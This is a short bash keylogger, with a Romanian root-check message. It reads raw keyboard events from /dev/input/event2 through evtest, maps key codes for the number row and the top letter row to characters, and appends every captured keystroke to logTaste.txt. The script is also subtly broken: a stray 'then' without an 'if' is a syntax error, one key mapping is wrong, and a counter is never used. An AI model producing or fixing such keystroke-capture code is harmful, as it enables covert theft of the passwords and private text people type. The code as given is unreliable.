#!/bin/bash

if [ "$(id -u)" != "0" ]
then
    echo "Acest script trebuie să fie executat cu privilegii de root." >&2
    exit 1
fi

input_device="/dev/input/event2" 
declare -i s=0
evtest "$input_device"| grep --line-buffered "Event: time" | while read -r line
do

	index=$(echo $line | egrep "KEY" | egrep -o "code [0-9]+" | egrep -o -m 1 "[0-9]+" )
	then
		case $index in
			2) echo 1 >> logTaste.txt ;;
			3) echo 2 >> logTaste.txt ;;
			4) echo 3 >> logTaste.txt ;;
			5) echo 4 >> logTaste.txt ;;
			6) echo 5 >> logTaste.txt ;;
			7) echo 6 >> logTaste.txt ;;
			8) echo 7 >> logTaste.txt ;;
			9) echo 8 >> logTaste.txt ;;
			10) echo 9 >> logTaste.txt ;;
			11) echo 0 >> logTaste.txt ;;
			12) echo "-" >> logTaste.txt ;;
			13) echo "=" >> logTaste.txt ;;
			16) echo q >> logTaste.txt ;;
			17) echo w >> logTaste.txt ;;
			18) echo e >> logTaste.txt ;;
			19) echo r >> logTaste.txt ;;
			20) echo t >> logTaste.txt ;;
			21) echo y >> logTaste.txt ;;
			22) echo u >> logTaste.txt ;;
			23) echo i >> logTaste.txt ;;
			24) echo o >> logTaste.txt ;;
			25) echo p >> logTaste.txt ;;
			26) echo { >> logTaste.txt ;;
			*) echo 0 > /dev/null ;; 
		
		esac
	s=s+1
done

